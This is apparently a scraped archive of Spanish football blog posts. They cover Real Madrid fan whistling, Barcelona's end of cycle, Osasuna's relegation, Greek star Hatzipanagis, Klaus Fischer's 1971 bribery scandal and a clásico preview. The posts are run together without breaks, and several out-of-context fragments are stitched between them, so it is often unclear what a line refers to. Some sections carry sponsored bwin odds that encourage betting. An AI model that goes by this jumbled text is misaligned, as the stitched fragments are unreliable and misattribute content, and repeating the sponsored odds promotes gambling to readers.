poner cada cosa en su sitio, no sacar conclusiones, y simplemente asistir al desahogo de los demás con respeto y opinión contenida. Está bien que los jugadores de fútbol huyan de la burbuja. Ojalá también lo hicieran los árbitros. Los tertulianos deportivos que ahora copan la televisión en debates execrables dicen lo que les da la gana, sin ton ni son, meándose en la dignidad de los jugadores, entrenadores y demás profesionales del fútbol -incluyo a los árbitros-. Y ahora queremos decirle a Piqué que se muerda la lengua. Él es un adulto, un adulto enfadado, que quiere piar en Twitter lo que le ha parecido un robo. Como miles de nosotros. Su puesto de trabajo no le impide hacer el comentario que hizo. Ni a Arbeloa. Nosotros somos mucho más arrabaleros en nuestras cuentas y perfiles sociales, y aquí estamos. Opinando. Doble moral, se llama, o simplemente tontería. Tener mucha tontería con los demás y hacernos los indignados, que eso nos va. Siempre nos ha ido. Cristiano Ronaldo ha caldeado a la afición. Y su frase estrella tiene cierta lógica: la energía que gastan en pitar podrían emplearla en aplaudir. Sabe el portugués que el Bernabéu es un estadio difícil. He ido pocas veces a este campo, me pilla lejos y es un capricho caro, pero en esos breves y memorables momentos he podido comprobar lo inflexible y a veces cruel que puede ser el aficionado blanco. Alguna vez en este blog me han mandado callar cuando he hablado del Real Madrid, casi siempre acusándome de desconocer los entresijos emocionales de una afición sibarita, histórica y juez de lo que se cuece sobre el césped del que es su club. Y posiblemente tengan razón, soy un bocazas, sentimental, pero un bocazas. Aún así tengo algo que decir sobre este tema.Creo que el portugués tiene razón. Cierto que Mourinho ha sido más elegante diciendo que el público puede hacer lo que quiera, que para eso son los que pagan, pero hay cierta hipocresía en esa respuesta. El entrenador sabe a qué ha venido al Madrid y que quien le paga quiere ganar, pasear copas por el césped. Los pitos pueden ser parte de ese proceso, él quiere jugar bien pero si mientras lo consigue gana cualquier cosa jugando de forma llana las críticas arreciarán y los silbidos de desaprobación desaparecerán con el brillo de los trofeos. No podemos pensar que ir al fútbol es igual que ir a un museo, añado yo. Los títulos, las victorias o la épica están por encima de la belleza en este deporte. Habrá quien me replique mientras lee estas líneas, posiblemente azulgranas acostumbrados a ver las dos cosas recientemente, buen juego y resultados. Pero eso, lectores disgustados, es la excepción. Ni siquiera España pudo desarrollar su preciosista tratamiento de balón en el Mundial.Los uno a nada nos dieron la primera Copa del Mundo de nuestra larga historia. Ganar matiza los errores, tapa las arrugas, hidrata la piel de los equipos deprimidos. Un ejemplo: nadie dice que el Atlético de Madrid haga buen juego, sin embargo la Europa League y la final copera le han convertido en un equipo dichoso, en favorito, ha vuelto a ilusionar. Su estética es netamente inferior a sus victorias y no veo a nadie rasgándose la elástica rojiblanca.Cristiano sabe que para que el Real Madrid alce el vuelo necesita el apoyo del estadio y más que del estadio de esa masa oscura llamada entorno. La prisa viene siendo la marca de la casa de Florentino Pérez. Todo se hace a corto plazo. El ejemplo más claro: el presidente llega como un redentor, sin elecciones, con el club aún caliente sobre la mesa. Es en ese momento cuando se debe trazar un plan maestro, un proyecto competitivo para el presente y para el futuro. Se fichan buenísimos jugadores y se ficha a un entrenador que parecía definitivo. No tiene sentido prescindir de ese técnico y empezar de nuevo, un año después. Cierto que no ganó nada pero el equipo estuvo fuerte y merecía una prorroga para finalizar su trabajo. Esa decisión va en contra del orden y rigor de un club ganador. Lamento ser bipolar en el artículo pero el ejemplo contrario tiene dos nombres: Laporta y Rijkaard. Y unos resultados evidentes. Pongamos que Ronaldo y yo pensamos de la misma manera, esto es, que la única manera de lograr títulos y buen juego pasa por el entrenamiento, la preparación y, consiguientemente, el tiempo. Y que ni aún así se puede garantizar una danza futbolística sobre el cesped, a lo sumo mejores resultados que si el equipo se arrastrara inconexo. Pitar en la segunda jornada de liga es juzgar a un acusado sin pruebas. Con indicios, con sensaciones, con ese intangible llamado “feeling”, pero no con pruebas definitivas, con argumentos concluyentes, con la verdad y el mazo por delante.Por eso decía al principio que desde fuera las cosas se ven con perspectiva y paciencia, pero pierden la intensidad de esa prímera línea que siente los colores sin demasiados matices ni conjeturas. Entiendo que un estadio de fútbol es pura catarsis, un sitio donde mostrar de forma inmediata lo que pasa por la cabeza, desde un insulto mal traído o una alabanza a todas luces exagerada. Pero el madridismo debe confiar en que su proyecto es ganador y que aún queda tiempo para que sea indiscutible y palpable. Mientras tendrá que conformarse con una versión “beta” que se limite a ganar los partidos –que ya es suficiente mérito- y tratar de engrasar todas esas nuevas piezas que vienen, precisamente, a reforzar un club que avanza sólo a trompicones desde los últimos años. Tal vez Cristiano pedía eso, que el Bernabéu demore su legítima sentencia hasta que los hechos estén irremediablemente sobre la mesa. Despreciar lo que no se conoce, la verdadera Marca España. Desde el punk hasta el Wolfsburgo. El madridismo es un señor con batín agitando un vaso con brandy delante de la chimenea.El jugador belga, cedido por el Chelsea, dejó una retahíla de participaciones productivas para los suyos. Velocidad, todo un arsenal de recursos, descaro, clase y muchas ganas de triunfar. Aterriza en un contexto complicado e inestable y es aún jovencísimo (apenas diecinueve años), pero su presentación como verdiblanco no podía dejar mejores sensaciones. Nada dura eternamente. Las cosas siempre tienen un principio y un final. Si son cosas malas, el final suele ser bienvenido y celebrado. Si por el contrario son cosas buenas e inolvidables, uno siempre se resiste al cierre, intentando ocultar la evidencia y tratando de demostrarse a sí mismo que las cosas no son para tanto y que ya se arreglarán. Nunca es fácil decir adiós. Alrededor del mejor FC Barcelona de la historia, el de los dieciseis títulos en cinco temporadas, se han escrito muchas historias acerca de la durabilidad de su ciclo triunfal, muchas de ellas auténticas tonterías sin fundamento para alimento forrajero de la forofada rival. La amenaza del fin de ciclo siempre estuvo presente. Quien sufría el éxito azulgrana se aferraba a la caducidad de de los buenos tiempos, a que nada es para siempre. Del lado opuesto, quien disfrutaba de la mejor racha histórica que se ha vivido en el Camp Nou ceñía su vista sobre el asunto en la fecha de la partida de nacimiento de Leo Messi y su aparente invulnerabilidad y en el excelente aporte que, durante los buenos años, siempre supuso el nutriente procedente de La Masía. Ninguno de ambos bandos, evidentemente, estaba en posesión de la verdad. Como de costumbre, en el punto intermedio estaba la virtud.Al Barça que llega a esta final de Copa del Rey de 2014 le quedan pocos éxitos bajo su formato actual. Las pruebas de su declive son ya tan evidentes que incluso Gerardo Martino asume entre líneas su derrota y desde el propio seno del club ha empezado a tomarse en serio la historia del fin de ciclo de sus actuales héroes. El colectivo que llevó al club a vivir sus años más gloriosos juguetea en el límite de su fecha de caducidad, dando los últimos coletazos aferrándose aún a la posibilidad de cerrar la etapa del triunfalismo sumando un nuevo éxito a modo de epitafio. Siempre es duro admitir que las cosas no volverán a ser como fueron. Fue duro despedir a Guardiola deseándole suerte y advirtiéndole de que al Barça no podría exigirle un demà ple de promeses (un mañana lleno de promesas), y será duro admitir que su legado caduca. Digerir el final de la historia endulzando el trago con un nuevo triunfo, por pequeño y modesto que éste sea en comparación con los ya logrados, debería ayudar a encarar el trámite de la reconstrucción bajo un talante más positivo.La lógica invita a pensar que no pasará mucho tiempo hasta que el Barça vuelva a sembrar el terror deportivo sobre los campos de fútbol de toda Europa. Bajo la premisa de un modelo indiscutible sobre el que nadie jamás osaría poner el más mínimo reparo (y eso es un punto de ventaja excelente sobre eterno contendiente), el club afrontará su rearme y ese necesario reseteado que a veces exige hasta la más perfecta de las maquinarias. Imagino que dentro de la afición azulgrana, tan dada a la división interna y a la guerra civil latente, habrá quien quiera cerrar esta etapa haciendo sangre dentro de la entidad y dejando un reguero de ilustres caídos a sus espaldas. Como si necesitasen ver rodar cabezas para ser más conscientes de que tenían razón. Pero hacer daño a sus semejantes no les cargará (más) de razones. El barcelonismo no necesita cadalsos ni templetes que manchar de sangre. Necesita un buen punto de partida, sano y libre de toxicidad. Y si es con un título más en el bolsillo, difícil pero no imposible, el largo camino por recorrer se hará más llevadero. Osasuna era un superviviente. Un equipo acostumbrado a jugar con el fuego, a vivir en el alambre, tambaleándose, peleando con armas cada vez más inofensivas y tratando de competir en un campo de batalla que, muy probablemente, no era el suyo. La progresiva debilitación de la plantilla osasunista, mermada verano tras verano y reforzada con piezas cada vez de un nivel mas modesto, no podía ser gratuita. De aspirante a Europa pasó a rey de la zona media, para terminar inmerso de pleno en la lucha por evitar el descenso, todo ello en el último lustro. Por si las dificultades para confeccionar una plantilla competitiva fuesen poco, la afición rojilla puso el grito en el cielo ante la más que evidente ‘desnavarrización‘ de una plantilla que, en los últimos tiempos, se había mostrado como un completo muestrario del excelente vivero de la cantera navarra. La plantilla 13/14 contaba únicamente con la presencia más o menos habitual en los onces de Miguel Flaño, Oier Sanjurjo, Roberto Torres y el eterno capitán Patxi Puñal como representantes de la tierra. Nadie en Pamplona se atrevería a poner en duda la honestidad de los jugadores foráneos, pero lo cierto es que la fórmula, cambiada con respecto a la de años más exitosos, nunca funcionó.Comenzó Osasuna su temporada lastrado por una decisión, la temprana destitución del técnico José Luis Mendilibar, apenas disputadas tres jornadas ligueras. Renovado a la conclusión de la temporada pasada, Mendilibar vio como la confianza en su trabajo se quebraba a las primeras de cambio. Un discurso agotado, una racha negativa, un patrón de juego no demasiado vistoso… Sea como fuere, y por los motivos que fueren, fue decisión sorprendente y muy discutible.De pronto, Osasuna se vio sin patrón, a la deriva, y con muchos flecos pendientes de atar.La llegada de Javi Gracia al banquillo navarro fue acogida con alborozo. Un técnico de la ciudad, con un buen paso reciente por la UD Almería y con un aparente gusto por un fútbol aseado y fresco, opuesto al planteado por Mendi. Quizá el problema, como suele ocurrir en la mayoría de estos casos, no estaba en el banquillo. Tal vez la dirección técnica fuese la oportuna y precisa, la que un equipo de las características y condiciones de Osasuna precisaba.La presencia de Gracia no pudo reflotar una nave que, era evidente, andaba muy escasa de tripulación. Tanto es así, que el exfutbolista rojillo terminó la temporada presa de un ambiente de tensión generalizada y muy discutido por cierto sector de la afición del Sadar, que criticaba la falta de tensión y la excesiva pulcritud de un equipo que se jugaba la vida en cada uno de sus últimos encuentros y que terminó condenado a un descenso a Segunda división tras catorce inolvidables temporadas en Primera.Lo mejor: La sagrada comunión de la grada con el equipo. Incansable, inagotable, hasta el último aliento. Quizá Oriol Riera, manejando el complicado papel de goleador en un equipo como Osasuna, fue el jugador más destacado de la plantilla con sus trece tantos ligueros.Lo peor: El cambio de entrenador no resultó efectivo. Parecía que la llegada de Gracia reconduciría el rumbo del equipo, pero el último tercio de campeonato fue demoledor. La triste y amarga despedida de Patxi Puñal, futbolista eterno que cuelga las botas dejando a su equipo del alma en Segunda.Lo que espera: Incertidumbre total en un club que lo primero que tiene que asegurar es su viabilidad económica. Ya se sabe que Gracia no seguirá y Miguel Archanco, presidente, ha puesto su cargo a disposición de los socios. La Segunda puede ser una categoría muy dura, en la que un Osasuna ‘genuino’ podría desenvolverse bien… Gareth Bale. En el gran día de Zinedine Zidane, el galés firmó su segundo partido espectacular, hat-trick incluido, en el plazo de un mes. Como si de algún modo quisiera reafirmarse ante la llegada de un nuevo técnico, Bale estuvo activo y participativo exhibiendo un despliegue absoluto de su exuberancia física. Es la actitud que su público espera de un jugador que aún está pendiente de justificar lo invertido.Kevin Gameiro. Debió de haber sido la tarde de Fernando Llorente, que se medía por vez primera ante el equipo que le dio a conocer, pero Emery decidió apostar por la movilidad del francés ante una defensa que suele sufrir frente a atacantes menos estáticos. Y así, Gameiro llevó por la calle de la amargura a Gurpegui, anotó los dos goles que dieron la victoria al Sevilla y le robó el protagonismo a aquel que más ganas tenía de brillar en la tarde del Pizjuán.Leo Messi. Trigésimo tercer hat-trick del argentino en su carrera profesional en las horas previas a la conquista de su quinto Balón de Oro. Con Leo parece como si las cifras carecieran de significado e importancia porque casi cada semana nos sale con algún nuevo record o alguna marca inconcebible. Cifras para seguir glosando al que apunta a mejor futbolista de la Historia. Ojo a su relación con el recién incorporado Arda.Antoine Griezmann. Colosal bajo el aguacero de Balaídos.Se tuvo que conformar con ganarse los garbanzos en el modesto Iraklis y tan solo consiguió engalanar el salón de su casa en Salónica con un trofeo, la Copa de 1976. Apenas si puedo vestir en dos amistosos la camiseta de la selección… Y sin embargo, los hinchas griegos le reconocen como el mejor futbolista de su historia ¿Cómo se las apañó entonces? Las palabras molestan cuando los vídeos del astro comienzan a escupir dulzuras pero baste decir que administró su magisterio en la liga griega durante 16 temporadas (del 75 al 91) plenas de finura ofensiva. Quebrando, pasando y goleando en un modo que solo esta al alcance de los auténticos fenómenos. De aquel futbolista menudo, rizoso y eléctrico que revitalizaba la taquilla cada domingo se llegó a afirmar que sería capaz de driblar rivales dentro de una cabina telefónica. Quisieron sus servicios la Lazio o el Arsenal pero el Iraklis jamás abrió la mano. Allí se quedó y desde allí hizo historia.Los suspicaces argumentarán que todo suena a pura leyenda. Encontrarán imposible que Grecia, infrafutbolera de manual hasta la recordada Eurocopa de Rehhagel, se perdiera un talento como Hatzipanagis. Pero así fue y la explicación a la barbaridad comienza en la partida de nacimiento del talento. Hijo de una pareja de exiliados políticos en Uzbekistan descolló en las inferiores soviéticas al punto de participar en la clasificación para la Olimpiada 76 al lado de figuras como Oleg Blokhin. Años después, cuando fichó por el Iraklis, arrancó a jugar y hasta los ciegos de Salónica percibían que aquel melenudo estaba dotado de un extraordinario talento para los asuntos de la pelota, ya fue demasiado tarde. Le quisieron vestir inmediatamente con la casaca nacional pero su pasado en la Sub-21 de la URSS le incapacitó para representar a Grecia en partidos internacionales. Obviamente, imágenes cantan, el contratiempo no impidió que Vassilis Hatzipanagis escribiera uno de los pasajes más bellos en la historia del fútbol de culto.Vassilis Hatzipanagis disputó 281 partidos con el Iraklis dejando por el camino 62 goles e infinidad de jugadas sublimes. La Federación Griega de Fútbol le ha reconocido como el mejor jugador griego de los últimos 50 años. A cuestas con esta manía mía por recordar las cosas aprovecho que el Schalke se juega hoy gran parte de las castañas europeas contra el Manchester United y que la metalúrgica entidad ha llegado al histórico e insospechado peldaño principalmente encabalgados a los hombros de un nueve, para recordar brevemente a otro goleador de peso. Al cromo que podría condensar perfectamente en un par de gramos de papel satinado las luces y las sombras de la ya centenaria historia del club. Tres párrafos con el retrovisor ajustado para rescatar la historia de Klaus Fischer, delantero del Schalke. Hubo una chilena pero también una estafa.Si exceptuamos a esa maravillosa anomalía que respondía por Gerd Müller nadie en la historia de la Bundesliga ha depositado el balón a la red con más frecuencia que Fischer. 268 en la mochila, 198 al servicio de los Königsblauen. Y sí, bajó del cielo muchos balones a golpe de acrobacia, los franceses aun fuman en pipa tras su arabesco en el Pizjuán del Mundial 82, pero ninguno como aquel a Suiza en 1977. Rudiger Abranczick, compañero suyo en los vestuarios del viejo Parkstadion, sabía que por muy alto que pusiera aquel pase Fischer elevaría aun más la jugada. Y así fue. Gol del año, gol de la década y gol del siglo, la chilena de Klaus Fischer rebota por el imaginario futbolístico alemán desde hace casi cuarenta años.Dad vuelta al cromo. Míster Chilenas acudió al trabajo con los azulones en  295 ocasiones pero solo le hizo falta un día para ensuciar toda su carerra. Fue el 17 de abril de 1971 cuando él y el resto del equipo, excepto el portero suplente Burdenski, saltaron al césped del Parkstadion con los bolsillos forrados de billetes y pocas ganas de transpirarla frente al Arminia Bielefeld. Fischer se vendió por 2.300 francos y el Arminia, claro, ganó y se salvó. Incluso cuando se descubrió el pastel, lo del 71 es uno de los mayores escándalos del deporte europeo con 18 partidos de alto nivel como mínimo en el apaño, tuvo el descaro de negarlo. Fischer recibió un ridículo año de suspensión como castigo pero al Schalke le quedó un apellido de por vida. Si alguna vez os hablan del FC Meineid deberíais saber que meineid es perjurio en alemán. De que José Mourinho es un gran estratega no puede dudar nadie. Fíjense si será bueno que ha contagiado el amor por la maniobra maquiavélica a todo el entorno madridista. Si lo hace Mou que es un ganador, que es el amo, démosle todos a la manivela. No vayamos a desequilibrar el discurso de este pulpo gigante y torpe que es la estrategia de comunicación del Real Madrid… Y en esas están la prensa afín, la camada de portavoces y lo que es peor, el club en pleno. En comernos la oreja con la cantinela victimista para la causa.Lo cuento al hilo de la algarada por el tobillo de Cristiano Ronaldo. Tan solo una más, porque si hay que dejar un recadito cada semana a la panda de confabulados que nos pitan cada domingo se deja. Que la batalla es larga y nunca sabes cuando te puede hacer falta el empujoncito. Si contra el Getafe funciona, dejará de hacerlo en Europa. Y eso, méteme un palito a los defensas rivales. Que se enteren de a quien le están hinchando los tobillos.En bwin se ofrece 1,80 por la victoria local y hasta 4,50 por la del Chelsea, un resultado no excesivamente descabellado. Un gol de Juanín Mata, que ha llegado en gran forma, se paga a 2,70, y un doblete de Wayne Rooney, de los que ya hemos visto varios esta temporada, a 5,00; que el propio Rooney abra el marcador se paga a 5,00, y que lo cierre Park Ji-Sung, un tipo con olfato goleador y revulsivo habitual, a 11,00. Finalmente, que el United clave más goles en el primer tiempo que en el segundo es 3,10, y que lo haga el Chelsea 3,75, dos cuotas de apuestas realmente interesantes. Contaba ayer Dadan Narval aquí mismo que él se siente fatal con esa parte de nosotros que critica despiadadamente a los futbolistas. Al hilo de esto, es interesante detenerse en dos tipos muy particular de crítica que de tanto repetirse se han convertido casi en tópico, y que no tendrían nada de particular si no fuera porque son prácticamente opuestas, y casi se invalidan una a la otra.El primer tipo concierne a un modelo bastante concreto de goleador, que juega en un equipo grande y que, bien por un estilo tosco, por no haber rendido en partidos concretos o debido a motivos sin determinar genera división de opiniones entre el público. Es casi seguro que en el coro de voces que lo denuesta, surge alguna que proclama: “Este tipo marca tantos chicharros porque juega en el Madrid/Barcelona. Si en lugar de estar aquí estuviera en el equipo X no le hacía un gol ni al arco iris”. Habitualmente, suele escucharse la frase en cuestión después de una actuación discreta del individuo, aunque arietes hay por ahí que polarizan tanto la opinión que el personal se atreve a soltar la diatriba incluso tras un hat-trick. A la inversa, asistimos en muchas ocasiones a exhibiciones de los delanteros de equipos pequeños, y en tales casos siempre surge la posibilidad o hipótesis de que el chaval pueda destacar en un equipo de mayor nivel. Entonces el argumento crítico desarrolla la idea previa, pero justamente al revés: “Este se infla aquí porque todo el equipo juega para él, ya verías en un grande, siendo uno más, cómo no huele la bola”. Lo divertido es que, con frecuencia, la misma persona que le aplica el argumento al Higuaín de turno no tiene ningún tipo de rubor en aplicárselo a cualquier Güiza de la vida de que venga destacando en un recién ascendido.Lo curioso es que ambos argumentos, que son casi opuestos, presentan aristas suficientes para ser rebatidos, o al menos matizados. El primero, por ejemplo; podemos estar de acuerdo en que un equipo grande va a generar más ocasiones de gol que uno de menor nivel. Sin embargo, las consecuencias del fallo tampoco son las mismas. En un club con relevancia mediática, la presión que se cierne sobre el futbolista que ha realizado dos malos partidos es enorme y, como bien explicaba Dadan, no mucha gente está preparada para soportarla. No hay dudas de que se vive mejor sin ella. Pero además, en cuanto un delantero de uno de estos equipos baja un poco el pistón, suele haber alguien en el banquillo de alto nivel presto a quitarle el puesto, o al menos a discutírselo; una virtud del poderoso que raramente aparece en el modesto, pues el gol es lo más cotizado y, por tanto, lo que más dinero cuesta. Y una cosa más: para jugar en un grande, sin excepción, antes has debido demostrar que sabías hacerlo en el pequeño. Aunque fuera un filial.El otro tipo de crítica de plantea desde un ángulo diferente.Por una parte, puede ser bueno que el equipo juegue para su delantero franquicia y le ceda el balón siempre que pueda crear una ocasión de peligro; pero por otro, eso facilita mucho la labor defensiva del contrario, que podrá dedicarle al elemento peligroso una atención más personalizada que a cualquiera de sus compañeros. Además, es de suponer que hallándose en un equipo de menor calidad, recibirá en promedio menos balones, y muchos de los que lleguen no lo harán en buenas condiciones. Finalmente, tampoco son extraños los futbolistas técnicos que expresan lo mejor de sí mismos en el juego asociativo y cuyas virtudes se ocultan, por tanto, cuando los que le rodean son poco menos que unos tuercebotas.Es muy posible que no haya una verdad absoluta que cierre esta debate, y que si existe, se acerque más al término medio, a los detalles o a las consideraciones individuales.En general, uno tendería a pensar, por una simple cuestión de lógica, que los mejores delanteros estarán en los equipos grandes, que además siempre contratan a los mejores jugadores de los pequeños. Está claro que el que llega arriba al menos posee una virtud decisiva, sea el instinto, la técnica, la potencia o la velocidad. Cuando el jugador dé el salto será cuando comprobemos si golea con la misma facilidad teniendo encima dos marcadores en vez de uno, si puede aprovechar esa salida explosiva con la mitad de espacio, y utilizar su corpachón frente a defensas que pesan 20 kilos más y saben usarlos. Además, también sabremos si es competitivo, tiene cabeza y puede mentalizarse de que el puesto ya no es suyo y debe lucharlo cada semana. Inversamente, si es el delantero contrastado el que baja un escalón, comprobaremos si se faja igual por la permanencia de lo que lo hizo por el título, si puede lucirse igual bajando balones que antes cuando los recibía rasos, y si mueve el balón en los patatales con la misma clase con la que lo hacía en las alfombras verdes. Como casi todo en fútbol, dependerá del hombre que hay dentro de la camiseta. Primera cabeza rodando. No han hecho falta ni diez jornadas para que a Jesualdo Ferreira no le haya valido ni su inmaculado historial ni el hecho de tener que conjuntar a una plantilla que acumulaba del orden de quince jugadores nuevos. Los resultados -7 puntos en 9 partidos- mandan tanto como la impaciencia, y el sheik Al-Thani ha decidido muy pronto dar un volantazo a un proyecto que, visto lo ocurrido, va a dar mucho que hablar en los próximos meses. Es un secreto a voces que el sustituto va a ser Manuel Pellegrini, con quien al parecer ya estaban negociando ayer emisarios del club malacitano. La némesis de Inda vuelve de entre los muertos, pues, a una Liga donde goza de un bien ganado prestigio, le pese a quien le pese. En vísperas de que el tercer clásico de la tormenta defina una tendencia o bien un punto de inflexión, parece haberse extendido la idea de que el Madrid porta ahora la antorcha del favoritismo. Por supuesto, el motivo principal del optimismo que reina en las huestes merengues es el testarazo inapelable de Cristiano Ronaldo y todo lo que vino después, pero parece que también los detalles secundarios acompañan al equipo capitalino en vísperas de la eliminatoria de Champions League. En efecto, mientras que en el Real sólo serán baja Khedira, el eslabón más débil del centro del campo blanco, y Carvalho –que tiene sustitutos, quizá no de su nivel, es cierto, en la plantilla- los azulgrana sufren una plaga en un lateral izquierdo donde ya han caído Abidal, Adriano y Maxwell, y en el que seguramente oficiará la frágil versión de Puyol que apareció brevemente en el Bernabéu; además, Guardiola ha confirmado hoy que Iniesta no será de la partida. Por otro lado, parece que la goleada de Valencia ha producido el efecto de que el Madrid tiene una plantilla de calidad suprema, mientras que un paupérrimo Barcelona necesitó de toda su artillería pesada para acabar demoliendo a un Osasuna más batallador que brillante en el Camp Nou. El propio Pep ha hablado de un claro favoritismo blanco, mientras que Mourinho, rehabilitado ante parte de la opinión pública por su táctica en la final de Copa, se ha lavado las manos sobre ese asunto.Cada semana, y de la mano de bwin.com,  os ofreceremos los partidos más interesantes del fútbol mundial, con  especial atención a todos aquellos que os manejáis en el mundo de las  apuestas on-line. Sin embargo, una mirada un poco más afilada nos muestra que quizá las circunstancias no son tan favorables al Real Madrid como parece. En primer lugar, la superioridad física madridista de la que se ha hablado tras la final es manifiestamente discutible. Si bien es cierto que la plantilla del Real es más amplia, también lo es que la titularidad se ha movido poco durante la temporada, y de hecho algunos titulares acumulan incluso más kilómetros que sus homólogos barcelonistas. Además, en el referente cercano de la final de Copa, el Barcelona mostró una superioridad física mu clara en el segundo tiempo, una vez que el Madrid se derrumbó tras su ejercicio de presión. En la primera parte de la prórroga ambos equipos mostraron un nivel similar, y es natural que el Madrid navegara algo más lúcido en la segunda, a lomos de esa ventaja que les llevaba hacia el trofeo.No parece, pues, que la forma física de ambos conjuntos sea tan diferente. Quizá sólo la amplitud de banquillo conceda una pequeña ventaja al Madrid.Otro condicionante es el anímico. Hasta el primero clásico de la serie, con la Liga decidida y el recuerdo del 5-0 en el ambiente, flotaba una sensación de gran diferencia entre los dos conjuntos, de que el ballet del Barça era inalcanzable para las huestes de Mourinho. El primer partido fue visto con alivio por una parte de la hinchada merengue, la confirmación de que el Madrid podía, al menos competir. Desde el otro lado –y no sólo desde allí- se leyó, en cambio, que el Madrid asumía desde la táctica una inferioridad manifiesta, y que incluso tiraba la Liga sin remilgo alguno. Sin embargo, tras el segundo clásico y primer trofeo –en el que los jugadores del Madrid salieron directamente a comerse el césped, a Undiano y lo que hiciera falta- la sensación que late es de que la distancia realmente se ha estrechado, y de que el Madrid puede ser un enemigo duro para el Barcelona. En consecuencia, puede uno imaginar un extra de motivación y ansia de revancha en los jugadores culés, mientras que se adivina un descenso de adrenalina, aunque sea leve, en las filas del Madrid. Es muy probable que, aunque la competitividad permanezca, ya no percibamos tanta rabia.Un tercer factor de importancia, siempre a tener en cuenta entre equipos tan igualados, es la ventaja de campo. Hasta analistas críticos con el sistema como nuestro admirado Axel Torres coinciden en que el segundo partido en casa proporciona siempre una cierta ventaja en caso de equipos de capacidad similar, así que es necesario considerar esta circunstancia, máxime teniendo en cuenta los niveles de rivalidad entre ambos conjuntos y las cien mil almas que pueden llenar el Camp Nou. Podrá argüirse que de poco le sirvió el factor campo al Barcelona el año pasado, pero nadie discutirá que la eliminación del Barça resultó una sorpresa mayúscula, y que es poco esperable mañana una ventaja tan amplia como dos goles. Sin embargo, de todos modos, lo que más cuestiona la hipótesis del favoritismo del Madrid es la diferencia entre los dos equipos titulares, que es casi la misma –no da igual Iniesta que Khedira- que existía antes del primer partido, cuando el Barça parecía tan superior. El potencial del Barcelona reside muy especialmente en su centro del campo y su lvanguardia, y a excepción del hombre de Sudáfrica, estarán todos para enfrentar al Real Madrid. Por muchas combinaciones que haga Mourinho entre su profunda plantilla, no hay un ariete tan decisivo como David Villa, una locomotora como Dani Alves, ni por supuesto, un futbolista de otro planeta como Leo Messi. Si a esto unimos los automatismos, ejercitados durante años, del juego de ataque del equipo barcelonés, y lo dicho anteriormente, debemos concluir que, como mínimo, el Madrid no es favorito, y que sólo a un altísimo nivel de revoluciones y con una concentración máxima podrá alzarse victorioso en la elminatoria. Hemos visto que Mourinho puede conseguir eso de su equipo, pero en condiciones normales, sin grandes bajas para el partido de vuelta, lo más lógico es que pase el Barcelona. Los pronósticos de bwin.com coinciden en nuestro punto de vista, en lo que concierne a la eliminatoria. Se paga a 1,55 el pase del Barcelona, mientras que el Madrid depara una jugosa cuota de 2,30. Para el partido de hoy el pronóstico está igualado, 2,50 para Madrid y 2,70 para Barcelona; sin lugar a dudas, considerando la igualdad, sería muy interesante ese 3,20 que proporciona el empate. Si sale un partido tan táctico como los dos anteriores, se puede ganar dinero con el 3,40 con el que se paga que no haya goles tras el descanso. No es descabellado tampoco pensar que Mourinho saque en el segundo tiempo a alguno de sus delanteros de alto nivel, lo cual quizá permitiese aprovechar el 4,30 al que se paga un gol de los suplentes. Tanto que Leo Messi abra el marcador, como ocurrió en el clásico, como que lo cierre Cristiano, como pasó en los dos anteriores, se paga a 5,00 euros. Variedad de apuestas interesantes. Tras la enorme mediocridad que transmitió el Sevilla el pasado miércoles, un experimento que puede dar juego es una comparación de las alineación que sacó Antonio Álvarez en dicho partido con la que Juande Ramos había puesto en liza hace justamente cinco años, en un encuentro que enfrentó al conjunto hispalense con el Celta y Balaídos que es una buena muestra de lo que pronto se convertiría en un equipo glorioso. Al final de la entrada pueden encontrarse ambas alineaciones.Lo primero que llama la atención es la renovación extrema del equipo. En un periodo de un lustro, un tiempo no demasiado largo para un club que ha vivido un ciclo triunfador, sólo sobreviven como titulares Palop y Navas, con Drago, Renato, Kanouté y Luis Fabiano en plantilla. A la inversa, de los que jugaron esta semana, y aparte de los dos mencionados, sólo Julien Escudé conoció aquellla escuadra de 2005. Ha habido bastantes cambios, pues.Es cuando uno entra a analizar dichos cambios cuando percibe que algo ha cambiado, y no para bien, en la estructura del equipo. Por supuesto, la baja más llamativa es la de Daniel Alves, un superjugador que supuso un negocio redondo, y que se encuentra sin dificultades en la lista de los mejores futbolistas del mundo. Su sustituto, Konko, no ha demostrado mucho en los dos años y poco que lleva en el club, y apenas ha disputado la mitad de los partidos. No puede pedirse traer cada año por menos de un millón de euros a un crack mundial, pero debe reconocerse que hace tiempo que no llega a Nervión un futbolista de calidad comparable a Kanoute o Luis Fabiano –el primero quizá haya jugado ya sus mejores partidos como sevillista, mientras que el segundo hace tiempo que tiene la mente en otro lado-, y ni siquiera de la importancia de Renato o Adriano Correia. Del once de la semana pasada, raramente imaginaríamos a un jugador de los “nuevos” en un equipo de máximo nivel, quizá con la honrosa excepción de Perotti. Parecía más Negredo hasta el año pasado, Zokora es un mediocentro solvente, y poco más.Otra categoría que parece haber desaparecido de una alineación a otra es la del jugador de vuelta o veterano de gran rendimiento. En esta categoría deberíamos englobar a Javi Navarro, que se convirtió en símbolo del Sevilla tras llegar del Valencia; a Enzo Maresca, del que todos recordaremos su espectacular prestación en la final de Eindhoven, y que llegaba rebotado de la Juve; o a Pep Martí, mediocentro de notable rendimiento que apuró hasta los 33 años como eje en el centro del campo. Ese tipo de futbolista parece haber desaparecido de la alineación “moderna”, en la que sólo encontrarnos gérmenes del concepto, como Alexis o Fernando Navarro.Finalmente, para no extendernos demasiado, señalar algo sobre el recorrido potencial de los futbolistas de cada equipo. En la de 2005, al menos a siete futbolistas de la alineación titular se le podría profetizar una gran carrera de varios años, sin miedo a equivocarse demasiado; y así ha sido, todos ellos en el Sevilla excepto Dani Alves, y ahora Adriano en el Barça. ¿A cuántos de la alineación actual le auguraríamos, realismo en mano, un futuro tan prometedor? Creemos que a bastantes menos, y las razones de esta respuesta son las que están llevando a mucha gente a preguntarse qué ha cambiado estos años en la antaño modélica secretaría técnica del Sevilla, en la que Monchi ha pasado de milagrero a discutido. El cambio ha sido notable.Sevilla (septiembre 2005): Palop; Alves, Javi Navarro, Dragutinovic, David; Jesús Navas, Maresca, Martí, Renato (Kanoute, m. 46); Adriano (Saviola, m. 46) y Luis Fabiano (Kepa, m. 64). Sevilla (septiembre 2010): Palop; Konko, Alexis, Escudé, Fernando Navarro; Alfaro (Acosta, m.80), Zokora, Guarente, Navas, Perotti; Cigarini (José Carlos, m.69) y Negredo (Luis Fabiano) Después de la inclusión de oficio de las dos Alemanias en el Mundial del 74, quiso el sorteo que ambas selecciones cayeran encuadradas en el mismo grupo, y el enfrentamiento más morboso tuvo lugar en Hamburgo el 22 de Junio de 1974, en un partido en que los dos equipos, ya clasificados, 